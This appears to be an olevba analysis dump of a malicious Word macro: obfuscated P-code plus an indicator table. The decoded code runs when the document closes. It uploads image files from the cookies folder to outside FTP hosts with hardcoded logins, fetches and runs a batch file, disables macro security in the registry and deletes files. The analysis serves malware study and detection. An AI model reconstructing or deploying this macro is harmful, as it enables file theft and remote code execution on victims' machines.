' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "rvegame"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "om"
' 	Add 
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "us"
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "r n"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vat"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "  "
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "drom"
' 	Add 
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "m"
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ut "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ".j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "q"
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #131:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sn 
' Line #132:
' 	Ld sn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "f"
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A " -i -n -s:"
' 	Add 
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "i"
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 " ex"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 " g"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 " l"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #136:
' 	Ld sn 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #139:
' Line #140:
' 	EndSub 
' Line #141:
' Line #142:
' Line #143:
' 	FuncDefn (Sub autoexit())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #146:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #147:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #148:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s1 
' Line #149:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c11 
' Line #150:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s1s 
' Line #151:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sns 
' Line #152:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sn 
' Line #153:
' 	SetStmt 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	Set Search 
' Line #154:
' 	LitStr 0x0003 "c:\"
' 	Ld c11 
' 	Add 
' 	Ld Search 
' 	MemSt LookIn 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Search 
' 	MemSt SearchSubFolders 
' 	BoS 0x0000 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Search 
' 	MemSt FileName 
' 	BoS 0x0000 
' 	Ld Search 
' 	ArgsMemCall Execute 0x0000 
' Line #155:
' 	Ld Search 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #156:
' Line #157:
' 	Ld sns 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "f"
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 " -i -s:"
' 	Add 
' 	Ld s1s 
' 	Add 
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	LitStr 0x0003 "el "
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0001 "f"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	LitStr 0x0003 "el "
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	LitStr 0x0003 "el "
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0001 "b"
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 ":l"
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	LitStr 0x0003 "el "
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0001 "f"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	LitStr 0x0003 "el "
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	LitStr 0x0003 "el "
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0001 "b"
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #167:
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #169:
' 	Ld s1s 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "o "
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemSemi 
' 	LitStr 0x0002 "-i"
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "o"
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 " l"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "gf"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "m"
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ut "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 " l"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "q"
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	PrintItemNL 
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	Ld Application 
' 	MemLd Version 
' 	SelectCase 
' Line #181:
' 	LitStr 0x0004 "10.0"
' 	Case 
' 	CaseDone 
' Line #182:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #183:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0006 "Access"
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #184:
' 	LitStr 0x0003 "9.0"
' 	Case 
' 	CaseDone 
' Line #185:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #186:
' 	EndSelect 
' Line #187:
' Line #188:
' 	Ld sns 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #189:
' Line #190:
' 	EndSub 
' Line #191:
' 	FuncDefn (Sub ToolsMacro())
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Sub FileTemplates())
' Line #194:
' Line #195:
' 	EndSub 
' Line #196:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |m1.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

